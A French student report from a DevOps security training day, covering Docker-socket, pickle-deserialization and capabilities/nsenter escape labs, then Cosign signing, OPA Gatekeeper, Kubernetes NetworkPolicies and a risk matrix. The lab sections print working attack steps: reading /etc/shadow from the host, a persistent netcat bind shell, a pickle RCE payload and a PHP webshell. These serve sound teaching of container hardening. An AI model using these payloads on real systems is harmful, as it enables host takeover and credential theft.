

# Documentation DevOps J5

## Partie 0 — Préparer l’environnement

### Commandes utilisées et explications

```bash
minikube start --driver=docker --memory=4096 --cpus=2       # Démarre un cluster Kubernetes local
kubectl cluster-info                                        # Vérifie l’accès et l’état du cluster
helm repo add stable https://charts.helm.sh/stable          # Ajoute le dépôt Helm stable
helm repo update                                            # Met à jour la liste des charts Helm
helm install guestbook stable/guestbook                     # Déploie l’application guestbook
kubectl get pods                                            # Liste les pods lancés dans le cluster
kubectl get svc                                             # Liste les services du cluster
minikube service guestbook --url                            # Donne l’URL d’accès au guestbook en local
```

### Erreurs rencontrées et corrections

| Commande                                 | Erreur                  | Correction apportée                                |
|-------------------------------------------|-------------------------|----------------------------------------------------|
| minikube start --driver=docker            | Docker non lancé        | Lancer le service Docker puis relancer Minikube    |
| helm repo add stable ...                  | Repo non trouvé         | Vérifier et utiliser l’URL officielle Helm stable  |
| kubectl get pods                          | Contexte non trouvé     | Passer sur le contexte minikube avec la commande   |
| minikube service guestbook --url          | Pas d’IP externe dispo  | Utiliser cette commande pour obtenir une URL locale|

### Apprentissages/Retours

- Minikube ne démarre que si Docker est bien actif.
- L’URL du repo Helm stable peut changer, toujours vérifier la doc officielle.
- Changer de contexte kubectl permet de cibler le bon cluster si besoin.
- L’accès aux services exposés se fait facilement avec `minikube service ... --url` en environnement local.



***

# Partie 1

## Exploitation du socket Docker


### Lab 1: Socket Lab
### Ce que nous avons fait

On a exploité la faille critique d'exposition du socket Docker dans un container qui n'aurait pas dû l'avoir. Cette exposition nous a permis de prendre le contrôle total de la machine hôte.

***

### Commandes et étapes clés

1. On a lancé le conteneur avec la socket Docker montée :

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -p 8080:8080 socket-lab
```

2. Depuis la webapp, on a exécuté des commandes pour lister les conteneurs :

```python
import os
output = os.popen("docker ps").read()
print(output)
```

3. Pour accéder pleinement à la racine de l’hôte, on a lancé un conteneur alpine privilégié montant la racine hôte :

```python
import os
os.system("docker run --rm --privileged -v /:/host alpine chroot /host sh")
```

4. Depuis ce conteneur, on a lu des fichiers sensibles :

```python
import os
output = os.popen("cat /host/etc/passwd").read()
print(output)
```

```python
output = os.popen("cat /host/etc/shadow").read()
print(output)
```

5. Pour garder notre accès, on a déployé un conteneur netcat en persistant sur le port 4444 :

```python
import os
os.system("docker run -d --rm --privileged -p 4444:4444 -v /:/host alpine sh -c 'while true; do nc -l -p 4444 -e /bin/sh; done'")
```

6. On a cherché un fichier flag pour preuve avec :

```python
import os
output = os.popen(
  "docker run --rm --privileged -v /:/host alpine "
  "find /host/home /host/root -name '*flag*' -o -name '*.txt' 2>/dev/null"
).read()
print(output)
```

7. Le flag trouvé est vide, on a lu son contenu via :

```python
output = os.popen(
   "docker run --rm --privileged -v /:/host alpine "
   "cat /host/home/soda/.vscode-server/extensions/ms-vscode.cmake-tools-1.21.36/release.flag"
).read()
print(output)
```

***

## Difficultés rencontrées (savoir-faire)

- Dans la webapp, les sorties des commandes ne s’affichaient pas via `os.popen()`, on a contourné ça en copiant le flag vers `/tmp` sur l’hôte :

```python
import os
os.system(
  "docker run --rm --privileged -v /:/host alpine "
  "sh -c 'cp /host/home/soda/.vscode-server/extensions/ms-vscode.cmake-tools-1.21.36/release.flag /host/tmp/flag.txt'"
)

output = os.popen("docker run --rm --privileged -v /:/host alpine cat /host/tmp/flag.txt").read()
print(output)
```

- On a identifié l’IP de l’hôte avec `ip addr` pour pouvoir utiliser le shell netcat persistant.

***

## Ce que nous avons appris (savoir)

- Exposer la socket Docker c’est quasi donner un accès root total à l’hôte.
- Les conteneurs ne sont isolés que si on limite bien les privilèges et les volumes montés.
- En environnement restreint (shell Python dans webapp), il faut savoir contourner les limitations de sortie des commandes.
- Chercher un flag c’est aussi comprendre ce qu’il représente : parfois un fichier vide veut juste dire que l’exploitation a réussi.
- La forteresse MITRE ATT&CK nous aide à nommer et classifier nos attaques pour mieux les expliquer.

***

## Correspondance avec MITRE ATT&CK

| Technique | Description                                       | Notre usage concret                       |
|----------|-------------------------------------------------|------------------------------------------|
| T1611    | Evasion du container vers l'hôte                 | Docker socket exposé + conteneur root    |
| T1086    | Exécution via interface en ligne de commande     | Utilisation des commandes Docker en mode privilégié        |
| T1189    | Exploitation de l’API Docker exposée              | Exécution d'un conteneur persistant sur l’hôte              |

***

## Conclusion

Avec ce lab, on s'est rendu compte que ne pas sécuriser le socket Docker, c’est laisser la porte grande ouverte à n'importe qui pour prendre la machine complète.

On a fait du root sur l’hôte, on a lu des fichiers sensibles, on a mis en place un accès persistant. Ce sont des attaques classique, mais qui marchent si les bonnes pratiques ne sont pas suivies.

***

***



## - Lab 2 : Root Lab
## Exploitation du serveur Flask via désérialisation pickle

### Ce que nous avons fait

- Mise en place d’un payload pickle malicieux capable d’exécuter du code arbitraire dans un conteneur Docker tournant un serveur Flask vulnérable.
- Envoi du payload sous forme binaire au serveur via HTTP POST.
- Validation de l’exécution effective du payload dans le conteneur avec privilèges root.

***

### Commandes principales utilisées et explications

1. Création du payload malicieux Python :

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/whoami_from_pickle.txt',))

payload = pickle.dumps(Exploit())

with open('exploit.pkl', 'wb') as f:
    f.write(payload)
```

2. Lancement du conteneur root-lab (mode privilégié) :

```bash
docker run --rm --privileged --security-opt apparmor=unconfined -p 8080:8080 -d root-lab
```

3. Envoi du fichier binaire pickle au serveur Flask :

```bash
curl -X POST -H "Content-Type: application/octet-stream" --data-binary @exploit.pkl http://localhost:8080/upload
```

4. Vérification dans le conteneur que la commande s’est exécutée :

```bash
docker ps -q -f ancestor=root-lab
docker exec -it <CONTAINER_ID> cat /tmp/whoami_from_pickle.txt
```

La sortie affichée est `root`, attestant de l’exécution avec privilèges élevés.

***

### Difficultés rencontrées

| Difficulté                                      | Solution adoptée                                   |
|------------------------------------------------|---------------------------------------------------|
| Envoi correct des données binaires au serveur   | Ajout du header HTTP `Content-Type: application/octet-stream` |
| Validation et contrôle du conteneur post-exploitation | Usage  des commandes Docker `docker exec` et gestion des IDs de conteneurs |

***

### Ce que nous avons appris

- La désérialisation Python non sécurisée permet une exécution arbitraire avec un impact critique.
- La configuration `--privileged` de Docker ouvre des risques majeurs d’élévation de privilèges.
- L’importance d’un en-tête HTTP adapté pour transmettre efficacement des données binaires.
- L’intégration de la validation dans un environnement conteneurisé pour sécuriser les expérimentations.

***

### Conclusion

Ce lab démontre  qu’une mauvaise gestion de la désérialisation couplée à une configuration permissive Docker peut entraîner une exécution de code en tant que root dans un conteneur. Cette attaque simple met en lumière la nécessité de sécuriser les flux d’entrée des API et de limiter strictement les droits accordés aux conteneurs Docker.

***


# Lab 3 : Capabilities Lab

## Ce que nous avons fait

- Contrôle d’un conteneur Docker avec toutes les capacités (`--cap-add=ALL`) et accès au namespace PID hôte (`--pid=host`).
- Exploitation via upload d’un webshell PHP fonctionnel.
- Utilisation de `nsenter` pour s’échapper du conteneur et prendre un shell root sur la machine hôte.
- Exploration du système hôte pour confirmer l’accès root.

---

## Commandes principales utilisées et explications

1. Construction de l’image depuis le Dockerfile :

```
docker build -t capabilities-lab .
```

2. Lancement du conteneur avec capacités étendues et PID hôte :

```
docker run --rm --cap-add=ALL --pid=host --security-opt apparmor=unconfined --name capabilities-lab -p 8080:8080 capabilities-lab
```

3. Création locale du fichier `shell.php` :

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

4. Upload du webshell sur le serveur :

```
curl -F 'file=@shell.php' http://localhost:8080/
```

5. Vérification d’exécution avec :

```
curl "http://localhost:8080/uploads/shell.php?cmd=id"
```
(Sortie avec l’utilisateur `www-data` du conteneur)

6. Récupération de l’ID du conteneur :

```
docker ps -f name=capabilities-lab --format "{{.ID}}"
```

7. Shell interactif dans le conteneur :

```
docker exec -it <CONTAINER_ID> bash
```

8. Sortie du conteneur vers hôte avec `nsenter` :

```
sudo /usr/bin/nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

9. Vérification que l’on est root sur l’hôte :

```
id
```

---

## Difficultés rencontrées

| Difficulté                                    | Solution                                  |
|-----------------------------------------------|-------------------------------------------|
| Faire l’upload via curl                       | Création d’un fichier PHP avec echo       |
| Comprendre la persistance du conteneur docker | Garder le shell docker run ouvert         |
| Faire sortir le shell avec nsenter            | Utilisation précise de la commande nsenter |
| Plus de visibilité sur les fichiers flag      | Recherche avec find et grep dans `/home`  |

---

## Ce que nous avons appris

- Attention à la configuration des capacités Docker : `--cap-add=ALL` ouvre porte à la montée en privilèges.
- `--pid=host` permet au conteneur de voir/provoquer des actions sur l’hôte.
- Upload de fichiers non filtrés permet d’exécuter du code arbitraire.
- L’outil `nsenter` est puissant pour sortir d’un conteneur vers hôte.
- L’exploration d’un système compromis nécessite une méthode organisée (recherche de fichiers, validation).

---

## Conclusion

Ce lab illustre parfaitement une faille critique Docker. Avec un accès total aux capacités et PID hôte, un attaquant peut non seulement exécuter du code sur le conteneur, mais aussi complètement contrôler la machine hôte. Il est primordial de limiter ces droits pour garantir la sécurité.

---

# Partie 2 : Signature d'une image Docker avec Cosign

## Ce que nous avons fait

- Installation de Cosign version 3.0.2 sur notre environnement Linux.
- Génération d'une paire de clés privée/publique protégée par mot de passe.
- Construction d'une image Docker locale simple basée sur `busybox`.
- Mise en place d'un registre Docker local pour héberger notre image sans dépendre de Docker Hub.
- Signature de l'image Docker avec Cosign en utilisant la clé privée.
- Vérification de la signature avec la clé publique pour confirmer l'intégrité de l'image.

---

## Commandes  utilisées 

1. Installation de Cosign :

```bash
COSIGN_VERSION=$(curl -s https://api.github.com/repos/sigstore/cosign/releases/latest | grep tag_name | cut -d '"' -f 4)
wget https://github.com/sigstore/cosign/releases/download/${COSIGN_VERSION}/cosign-linux-amd64
chmod +x cosign-linux-amd64
sudo mv cosign-linux-amd64 /usr/local/bin/cosign
```

2. Génération d'une paire de clés :

```bash
cosign generate-key-pair
```
(Saisie d'un mot de passe pour protéger la clé privée)

3. Création du Dockerfile dans `~/devops-j5/monimage` :

```dockerfile
FROM busybox
CMD ["echo", "Bonjour, image signée avec Cosign!"]
```

4. Construction de l'image :

```bash
docker build -t monimage:latest .
```

5. Lancement d'un registre Docker local :

```bash
docker run -d -p 5000:5000 --restart=always --name registry registry:2
```

6. Taggage et push de l'image vers le registre local :

```bash
docker tag monimage:latest localhost:5000/monimage:latest
docker push localhost:5000/monimage:latest
```

7. Copie des clés dans le dossier de travail :

```bash
cp ~/devops-j5/formation-lab-docker-secu/3.capabilities/cosign.key ~/devops-j5/monimage/
cp ~/devops-j5/formation-lab-docker-secu/3.capabilities/cosign.pub ~/devops-j5/monimage/
```

8. Signature de l'image :

```bash
cosign sign --key cosign.key localhost:5000/monimage:latest
```

9. Vérification de la signature :

```bash
cosign verify --key cosign.pub localhost:5000/monimage:latest
```

***

## Difficultés rencontrées

| Difficulté                                                         | Solution                                                                 |
|--------------------------------------------------------------------|--------------------------------------------------------------------------|
| Commande `cosign sbom` non disponible dans notre version          | Étape ignorée car non critique pour la suite                            |
| Erreur `UNAUTHORIZED` lors de la signature directe                 | Mise en place d'un registre Docker local                                 |
| Erreur `cosign.key: no such file or directory`                    | Copie des clés depuis le dossier de génération vers le dossier de travail |
| Tentative de signature d'image publique sans compte Docker Hub    | Utilisation d'une image construite localement et registre local         |

***

## Ce que nous avons appris

- **Cosign et signature d'images** : Cosign permet de signer cryptographiquement des images Docker pour garantir leur intégrité et provenance. La signature utilise une clé privée protégée par mot de passe.

- **Registre Docker local** : Pour contourner les limitations d'authentification Docker Hub, il est possible de déployer un registre local avec `registry:2`. Cela permet de travailler entièrement en local.

- **Gestion des clés** : Cosign cherche par défaut les clés dans le répertoire courant. Il est important de s'assurer que les fichiers `cosign.key` et `cosign.pub` sont accessibles dans le dossier de travail.

- **Vérification d'intégrité** : La commande `cosign verify` permet de valider qu'une image n'a pas été modifiée depuis sa signature, en vérifiant les claims cryptographiques et l'existence dans le transparency log.

- **Importance de la signature d'images** : Dans un pipeline DevOps, signer les images Docker est une bonne pratique de sécurité qui permet de garantir la chaîne d'approvisionnement (supply chain security).

***


# Partie 3 : Politiques de sécurité avec OPA Gatekeeper

## Ce que nous avons fait

- Installation et configuration d’OPA Gatekeeper dans un cluster Kubernetes local.
- Création d’une politique interdisant l’utilisation du tag Docker `:latest`.
- Création d’une politique imposant l’exécution des conteneurs en mode non-root.
- Test de ces politiques en validant le rejet des pods non conformes.

***

## Commandes principales

1. Installer Gatekeeper :

```bash
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml
kubectl wait --for=condition=ready pod -l control-plane=controller-manager -n gatekeeper-system --timeout=120s
```

2. Appliquer la politique interdisant le tag `:latest` :

```bash
kubectl apply -f no-latest-tag-template.yaml
kubectl apply -f no-latest-tag.yaml
```

3. Appliquer la politique imposant `runAsNonRoot` :

```bash
kubectl apply -f require-non-root-template.yaml
kubectl apply -f require-non-root.yaml
```

4. Tester la politique avec un pod utilisant `:latest` (doit être rejeté) :

```bash
kubectl apply -f test-latest.yaml
```

5. Tester la politique avec un pod ne définissant pas `runAsNonRoot` (doit être rejeté) :

```bash
kubectl apply -f test-non-root.yaml
```

***

## Ce que nous avons appris

- OPA Gatekeeper permet une gouvernance fine de la sécurité Kubernetes via des règles déclaratives.
- La maîtrise des ConstraintTemplates et Constraints est clé pour définir des politiques adaptées.
- Interdire `:latest` améliore la traçabilité et la qualité des déploiements.
- Forcer l’exécution non-root renforce la sécurité au niveau des conteneurs.

***

***

# Partie 4 : Network Policies

## Ce que nous avons fait

- Activation de l’addon ingress controller sur Minikube pour permettre la gestion du trafic entrant.  
- Création de deux namespaces distincts : **backend** et **database**.  
- Déploiement des deux services :
  - backend (nginx)
  - database (Redis)  
- Mise en place de **Network Policies** afin de contrôler les flux réseau :
  1. Autoriser le **backend** à communiquer avec la **database**
  2. Autoriser **ingress-nginx** à accéder au **backend**
  3. Bloquer toute autre communication inter-namespace.  
- Vérifications par tests de connectivité réels avec `redis-cli` et `curl`,
  confirmant que seules les connexions prévues sont autorisées.

***

## Commandes utilisées et explications

1. **Activation de l’ingress sur Minikube :**

```bash
minikube addons enable ingress
kubectl get pods -n ingress-nginx
```

2. **Création des namespaces isolés :**

```bash
kubectl create namespace backend
kubectl create namespace database
```

3. **Déploiement de Redis dans le namespace database :**

```bash
kubectl apply -f redis-deployment.yaml -n database
```

Redis expose le port **6379** pour la communication.

4. **Déploiement du backend nginx dans le namespace backend :**

```bash
kubectl apply -f backend-deployment.yaml -n backend
```

Backend écoute sur le port **80**.

5. **Création des Network Policies :**

```bash
kubectl apply -f network-policies.yaml
```

Contenu du fichier :

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-backend-to-database
  namespace: database
spec:
  podSelector:
    matchLabels:
      app: redis
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: backend
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-ingress-to-backend
  namespace: backend
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          app.kubernetes.io/name: ingress-nginx
```

6. **Ajout du bon label au namespace backend (pour correspondre à la NetworkPolicy) :**

```bash
kubectl label namespace backend name=backend
```

7. **Test de la connectivité backend → Redis (autorisé) :**

```bash
kubectl exec -n backend backend-XXXX -- sh -c "apk add --no-cache redis && redis-cli -h redis.database.svc.cluster.local -p 6379 ping"
```

Résultat :
```
PONG
```

8. **Test de la connectivité ingress-nginx → backend (autorisé) :**

```bash
kubectl exec -n ingress-nginx ingress-nginx-controller-XXXX -- curl -s --connect-timeout 2 http://backend.backend.svc.cluster.local
```

Résultat :  
Affichage de la page **Welcome to nginx!**

9. **Test de la connectivité ingress-nginx → Redis (bloquée) :**

```bash
kubectl run -n ingress-nginx tmp-shell --rm -i --tty --image=alpine -- sh
apk add --no-cache redis
redis-cli -h redis.database.svc.cluster.local -p 6379 ping
```

Résultat :
```
Could not connect to Redis at redis.database.svc.cluster.local:6379: Operation timed out
```

***

## Difficultés rencontrées

| Difficulté | Solution |
|-------------|-----------|
| Network Policy ne fonctionnait pas au début | Ajout du label `name=backend` au namespace backend pour correspondre à la règle |
| Erreur `resource mapping not found` à l’installation de Gatekeeper | Changement du `PodDisruptionBudget` en `policy/v1` |
| Impossible d’accéder à Redis depuis backend au début | Correction du nom DNS → `redis.database.svc.cluster.local` |
| Pod ingress-nginx sans permission d’installation de paquets | Création d’un pod temporaire `alpine` dans ingress-nginx pour tester la connectivité |

***

## Ce que nous avons appris

- Une **Network Policy** permet de restreindre le trafic réseau entre pods, offrant une micro-segmentation fine.
- Les **namespaceSelector** et **podSelector** doivent correspondre précisément aux labels définis.
- L’importance d’ajouter les bons **labels** aux namespaces pour que les politiques soient effectives.
- En l’absence de Network Policy, tout pod peut communiquer librement : l’isolation est donc un vrai mécanisme de sécurité.
- Les tests manuels via `redis-cli` et `curl` sont essentiels pour confirmer la bonne mise en place.

***

## Conclusion

| Flux | Statut |
|------|--------|
| backend → database (Redis) | Autorisé |
| ingress-nginx → backend | Autorisé |
| Autres flux inter-namespaces | Bloqués |


# Partie 5 : Construire une matrice de risque

## Ce que nous avons fait

- Analyse détaillée de l'infrastructure Kubernetes mise en place (backend, Redis, ingress-nginx, Network Policies).
- Identification des risques pertinents associés aux composants et à leur sécurité réseau.
- Évaluation de chaque risque selon son impact et sa probabilité.
- Construction d’une matrice de risque complète respectant le modèle requis.
- Définition des actions de gestion de risque (remédiations) appropriées.
- Priorisation des actions selon les critères P0 à P4, avec estimation de l’effort en jours/homme (JH).

***

## Définitions des niveaux d’impact et probabilité

| Niveau     | Description Impact                                                                 | Description Probabilité                                                   |
|------------|-----------------------------------------------------------------------------------|--------------------------------------------------------------------------|
| Low        | Presque aucun effet négatif sur les fonctions ou ressources essentielles          | Très improbable ou contrôles efficaces en place                         |
| Medium     | Effet limité, dégradation mineure pouvant être supportée                         | Peu probable, contrôles existants mais pas à toute épreuve              |
| High       | Effet sévère, perte majeure de fonction, dommage important                        | Probable, risque significatif sans contrôle suffisant                   |
| Critical   | Effet catastrophique, affectant largement l’organisation et ses missions          | Très probable, absence de contrôle ou contrôle inefficace               |

***

## Gestion du risque

| Type       | Description                                                                      |
|------------|----------------------------------------------------------------------------------|
| Acceptation| Accepter le risque sans autre action                                            |
| Mitigation | Réduire la probabilité ou l’impact par des mesures spécifiques                   |
| Transfert  | Transférer le risque à un tiers (ex: sous-traitance)                            |
| Évitement  | Supprimer la cause ou le scénario de risque                                     |

***

## Matrice de risque

| ID | Risque                                         | Impact   | Probabilité | Gestion        | Remédiation associée                                 | Justification                         |
|----|------------------------------------------------|----------|-------------|----------------|-----------------------------------------------------|-------------------------------------------------|
| 1  | Accès non autorisé potentiel au backend via ingress-nginx | Medium   | Medium      | Mitigation     | Durcir les Network Policies ingress → backend       | Les règles réseau doivent être restrictives     |
| 2  | Communication non chiffrée entre backend et Redis          | High     | Medium      | Mitigation     | Mise en place de TLS et monitoring réseau            | Sensibilité des données stockées                 |
| 3  | Utilisation d’images non scannées vulnérables               | High     | High        | Mitigation     | Intégrer un scan d’images Docker dans pipeline CI/CD| Eviter l’exécution de vulnérabilités            |
| 4  | Pods s’exécutant avec privilèges élevés (root)             | Critical | Medium      | Évitement      | Politiques OPA Gatekeeper pour restrictions non-root | Risques élévation privilèges et compromission  |
| 5  | Configuration erronée des Network Policies                    | Critical | Low         | Mitigation     | Audits réguliers des policies réseau                  | Complexité des règles peut induire des failles  |

***

## Remédiations associées

| Remédiation                              | Description                                        | Priorité | Estimation (JH) | Risque(s) couvert(s)                |
|-----------------------------------------|--------------------------------------------------|----------|-----------------|-----------------------------------|
| Durcir Network Policies ingress → backend | Restreindre strictement les flux depuis ingress-nginx vers backend | P1       | 2               | 1                                 |
| Activer TLS sur communication backend → Redis | Sécuriser la communication avec chiffrement     | P0       | 3               | 2                                 |
| Scans automatisés d’images Docker       | Intégrer la sécurité images dans pipeline CI/CD  | P0       | 4               | 3                                 |
| Politiques OPA pour exécuter non-root  | Interdire l’exécution avec privilèges élevés     | P0       | 3               | 4                                 |
| Audits réguliers Network Policies       | Examiner la configuration pour prévenir erreurs  | P2       | 2               | 5                                 |

***

## Analyse de la priorisation

- Les remédiations P0 doivent être mises en place avant tout déploiement en production, car elles concernent la sécurité fondamentale des images et des privilèges pod.  
- La remédiation P1 sur les règles réseau ingress est critique pour limiter l’exposition du backend aux flux externes.  
- Les audits P2 sont à suivre pour maintenir la sécurité et corriger la configuration au fil du temps.





